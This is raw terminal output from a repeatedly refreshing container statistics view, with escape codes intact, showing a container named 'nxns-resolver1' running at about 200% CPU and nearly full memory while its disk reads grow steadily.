[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   206.14%   1.997GiB / 2GiB     99.87%    25.6MB / 20.8MB   979kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   206.14%   1.997GiB / 2GiB     99.87%    25.6MB / 20.8MB   979kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   206.14%   1.997GiB / 2GiB     99.87%    25.6MB / 20.8MB   979kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   204.12%   1.999GiB / 2GiB     99.95%    25.7MB / 20.9MB   1.95MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   204.12%   1.999GiB / 2GiB     99.95%    25.7MB / 20.9MB   1.95MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   204.12%   1.999GiB / 2GiB     99.95%    25.7MB / 20.9MB   1.95MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   204.12%   1.999GiB / 2GiB     99.95%    25.7MB / 20.9MB   1.95MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   205.36%   1.998GiB / 2GiB     99.88%    25.9MB / 21.1MB   2.39MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   205.36%   1.998GiB / 2GiB     99.88%    25.9MB / 21.1MB   2.39MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   205.36%   1.998GiB / 2GiB     99.88%    25.9MB / 21.1MB   2.39MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   205.36%   1.998GiB / 2GiB     99.88%    25.9MB / 21.1MB   2.39MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   193.78%   1.999GiB / 2GiB     99.97%    25.9MB / 21.1MB   2.61MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   193.78%   1.999GiB / 2GiB     99.97%    25.9MB / 21.1MB   2.61MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   193.78%   1.999GiB / 2GiB     99.97%    25.9MB / 21.1MB   2.61MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   193.78%   1.999GiB / 2GiB     99.97%    25.9MB / 21.1MB   2.61MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   200.55%   1.997GiB / 2GiB     99.87%    25.9MB / 21.1MB   2.94MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   200.55%   1.997GiB / 2GiB     99.87%    25.9MB / 21.1MB   2.94MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   200.55%   1.997GiB / 2GiB     99.87%    25.9MB / 21.1MB   2.94MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   200.55%   1.997GiB / 2GiB     99.87%    25.9MB / 21.1MB   2.94MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   211.59%   2GiB / 2GiB         99.98%    26MB / 21.2MB   3.73MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   211.59%   2GiB / 2GiB         99.98%    26MB / 21.2MB   3.73MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   211.59%   2GiB / 2GiB         99.98%    26MB / 21.2MB   3.73MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   211.59%   2GiB / 2GiB         99.98%    26MB / 21.2MB   3.73MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   198.00%   1.998GiB / 2GiB     99.92%    26MB / 21.2MB   4.59MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   198.00%   1.998GiB / 2GiB     99.92%    26MB / 21.2MB   4.59MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   198.00%   1.998GiB / 2GiB     99.92%    26MB / 21.2MB   4.59MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   198.00%   1.998GiB / 2GiB     99.92%    26MB / 21.2MB   4.59MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   204.36%   1.999GiB / 2GiB     99.96%    26MB / 21.2MB   6.32MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   204.36%   1.999GiB / 2GiB     99.96%    26MB / 21.2MB   6.32MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   204.36%   1.999GiB / 2GiB     99.96%    26MB / 21.2MB   6.32MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   204.36%   1.999GiB / 2GiB     99.96%    26MB / 21.2MB   6.32MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   204.35%   1.998GiB / 2GiB     99.91%    26.1MB / 21.3MB   8.3MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   204.35%   1.998GiB / 2GiB     99.91%    26.1MB / 21.3MB   8.3MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   204.35%   1.998GiB / 2GiB     99.91%    26.1MB / 21.3MB   8.3MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   204.35%   1.998GiB / 2GiB     99.91%    26.1MB / 21.3MB   8.3MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   204.35%   1.998GiB / 2GiB     99.91%    26.1MB / 21.3MB   8.3MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   204.35%   1.998GiB / 2GiB     99.91%    26.1MB / 21.3MB   8.3MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   201.73%   1.999GiB / 2GiB     99.96%    26.1MB / 21.3MB   11.1MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   201.73%   1.999GiB / 2GiB     99.96%    26.1MB / 21.3MB   11.1MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   201.73%   1.999GiB / 2GiB     99.96%    26.1MB / 21.3MB   11.1MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   201.73%   1.999GiB / 2GiB     99.96%    26.1MB / 21.3MB   11.1MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   192.72%   1.996GiB / 2GiB     99.80%    26.2MB / 21.3MB   13.3MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   192.72%   1.996GiB / 2GiB     99.80%    26.2MB / 21.3MB   13.3MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   192.72%   1.996GiB / 2GiB     99.80%    26.2MB / 21.3MB   13.3MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   192.72%   1.996GiB / 2GiB     99.80%    26.2MB / 21.3MB   13.3MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   211.81%   1.998GiB / 2GiB     99.92%    26.2MB / 21.4MB   16.5MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   211.81%   1.998GiB / 2GiB     99.92%    26.2MB / 21.4MB   16.5MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   211.81%   1.998GiB / 2GiB     99.92%    26.2MB / 21.4MB   16.5MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   211.81%   1.998GiB / 2GiB     99.92%    26.2MB / 21.4MB   16.5MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   196.03%   1.999GiB / 2GiB     99.95%    26.3MB / 21.4MB   20.7MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   196.03%   1.999GiB / 2GiB     99.95%    26.3MB / 21.4MB   20.7MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   196.03%   1.999GiB / 2GiB     99.95%    26.3MB / 21.4MB   20.7MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   196.03%   1.999GiB / 2GiB     99.95%    26.3MB / 21.4MB   20.7MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   203.44%   1.997GiB / 2GiB     99.84%    26.3MB / 21.5MB   28.3MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   203.44%   1.997GiB / 2GiB     99.84%    26.3MB / 21.5MB   28.3MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   203.44%   1.997GiB / 2GiB     99.84%    26.3MB / 21.5MB   28.3MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   203.44%   1.997GiB / 2GiB     99.84%    26.3MB / 21.5MB   28.3MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   199.20%   1.999GiB / 2GiB     99.94%    26.4MB / 21.5MB   37.7MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   199.20%   1.999GiB / 2GiB     99.94%    26.4MB / 21.5MB   37.7MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   199.20%   1.999GiB / 2GiB     99.94%    26.4MB / 21.5MB   37.7MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   199.20%   1.999GiB / 2GiB     99.94%    26.4MB / 21.5MB   37.7MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   204.30%   1.997GiB / 2GiB     99.84%    26.5MB / 21.6MB   55.8MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   204.30%   1.997GiB / 2GiB     99.84%    26.5MB / 21.6MB   55.8MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   204.30%   1.997GiB / 2GiB     99.84%    26.5MB / 21.6MB   55.8MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   204.30%   1.997GiB / 2GiB     99.84%    26.5MB / 21.6MB   55.8MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   210.99%   1.997GiB / 2GiB     99.86%    26.5MB / 21.6MB   78.8MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   210.99%   1.997GiB / 2GiB     99.86%    26.5MB / 21.6MB   78.8MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   210.99%   1.997GiB / 2GiB     99.86%    26.5MB / 21.6MB   78.8MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   210.99%   1.997GiB / 2GiB     99.86%    26.5MB / 21.6MB   78.8MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   194.33%   1.995GiB / 2GiB     99.74%    26.5MB / 21.6MB   87.9MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   194.33%   1.995GiB / 2GiB     99.74%    26.5MB / 21.6MB   87.9MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   194.33%   1.995GiB / 2GiB     99.74%    26.5MB / 21.6MB   87.9MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   194.33%   1.995GiB / 2GiB     99.74%    26.5MB / 21.6MB   87.9MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   194.33%   1.995GiB / 2GiB     99.74%    26.5MB / 21.6MB   87.9MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   194.33%   1.995GiB / 2GiB     99.74%    26.5MB / 21.6MB   87.9MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   207.87%   1.995GiB / 2GiB     99.77%    26.7MB / 21.8MB   115MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   207.87%   1.995GiB / 2GiB     99.77%    26.7MB / 21.8MB   115MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   207.87%   1.995GiB / 2GiB     99.77%    26.7MB / 21.8MB   115MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   207.87%   1.995GiB / 2GiB     99.77%    26.7MB / 21.8MB   115MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   190.59%   1.995GiB / 2GiB     99.77%    26.8MB / 21.9MB   140MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   190.59%   1.995GiB / 2GiB     99.77%    26.8MB / 21.9MB   140MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   190.59%   1.995GiB / 2GiB     99.77%    26.8MB / 21.9MB   140MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   190.59%   1.995GiB / 2GiB     99.77%    26.8MB / 21.9MB   140MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   210.09%   1.997GiB / 2GiB     99.87%    26.8MB / 21.9MB   174MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   210.09%   1.997GiB / 2GiB     99.87%    26.8MB / 21.9MB   174MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   210.09%   1.997GiB / 2GiB     99.87%    26.8MB / 21.9MB   174MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   210.09%   1.997GiB / 2GiB     99.87%    26.8MB / 21.9MB   174MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   193.73%   1.998GiB / 2GiB     99.91%    26.8MB / 21.9MB   211MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   193.73%   1.998GiB / 2GiB     99.91%    26.8MB / 21.9MB   211MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   193.73%   1.998GiB / 2GiB     99.91%    26.8MB / 21.9MB   211MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   193.73%   1.998GiB / 2GiB     99.91%    26.8MB / 21.9MB   211MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   212.00%   2GiB / 2GiB         100.00%   26.8MB / 22MB   250MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   212.00%   2GiB / 2GiB         100.00%   26.8MB / 22MB   250MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   212.00%   2GiB / 2GiB         100.00%   26.8MB / 22MB   250MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   212.00%   2GiB / 2GiB         100.00%   26.8MB / 22MB   250MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   197.51%   1.999GiB / 2GiB     99.95%    26.9MB / 22MB   292MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   197.51%   1.999GiB / 2GiB     99.95%    26.9MB / 22MB   292MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   197.51%   1.999GiB / 2GiB     99.95%    26.9MB / 22MB   292MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   197.51%   1.999GiB / 2GiB     99.95%    26.9MB / 22MB   292MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   202.43%   1.999GiB / 2GiB     99.96%    26.9MB / 22MB   329MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   202.43%   1.999GiB / 2GiB     99.96%    26.9MB / 22MB   329MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   202.43%   1.999GiB / 2GiB     99.96%    26.9MB / 22MB   329MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   202.43%   1.999GiB / 2GiB     99.96%    26.9MB / 22MB   329MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   206.29%   2GiB / 2GiB         100.00%   26.9MB / 22.1MB   371MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   206.29%   2GiB / 2GiB         100.00%   26.9MB / 22.1MB   371MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   206.29%   2GiB / 2GiB         100.00%   26.9MB / 22.1MB   371MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   206.29%   2GiB / 2GiB         100.00%   26.9MB / 22.1MB   371MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   193.92%   2GiB / 2GiB         99.99%    27MB / 22.1MB   418MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   193.92%   2GiB / 2GiB         99.99%    27MB / 22.1MB   418MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   193.92%   2GiB / 2GiB         99.99%    27MB / 22.1MB   418MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   193.92%   2GiB / 2GiB         99.99%    27MB / 22.1MB   418MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS
